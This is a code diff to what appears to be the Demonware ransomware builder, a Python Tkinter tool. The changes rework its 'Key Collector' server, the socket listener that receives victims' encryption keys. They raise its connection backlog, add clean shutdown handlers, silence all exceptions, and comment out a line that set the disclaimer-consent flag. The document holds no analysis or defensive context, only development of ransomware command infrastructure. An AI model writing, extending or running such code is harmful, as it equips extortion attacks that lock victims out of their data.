@@ -179,7 +179,7 @@ class MainWindow(Tk):
         }
 
 
-        self.options['agreed'].set(1)
+        #<activate>
         #<activate>
 
         if not self.options['agreed'].get() == 1:
@@ -432,6 +432,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.serv.title(string = 'Demonware Server - Key Collector')
         self.serv.configure(background = 'white')
         self.serv.resizable(0,0)
+        self.serv.protocol("WM_DELETE_WINDOW", self.close_server_by_click)
 
         self.serv.bind("<Escape>", self.close_server) # Press ESC to close window
 
@@ -807,16 +808,16 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         port = self.options['port'].get()
         socket_list = []
 
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.bind((host, port))
-        server_socket.listen(1)
+        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server_socket.bind((host, port))
+        self.server_socket.listen(10)
 
         self.insert_banner()
         self.serv.options['log'].insert('1.0', "Server started on port [%s] [%s]\nWaiting...\n" % (host, int(port)), 'deeppink')
 
         try:
             while True:
-                sockfd, addr = server_socket.accept()
+                sockfd, addr = self.server_socket.accept()
                 try:
                     while True:
                         data = sockfd.recv(1024)
@@ -852,11 +853,15 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 finally:
                     sockfd.close()
 
-        except KeyboardInterrupt:
-            print('Closed...\n')
+        except Exception as e:
+            pass
 
 
-        server_socket.close()
+        self.server_socket.close()
+
+    def close_server_by_click(self):
+        self.server_socket.close()
+        self.serv.destroy()
 
     def insert_banner(self):
         banner = '''
@@ -894,6 +899,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.serv.options['log'].insert('1.0', banner + '\n', 'red')
 
     def close_server(self, event):
+        self.server_socket.close()
         self.serv.destroy()
 
     def close_compile(self, event):
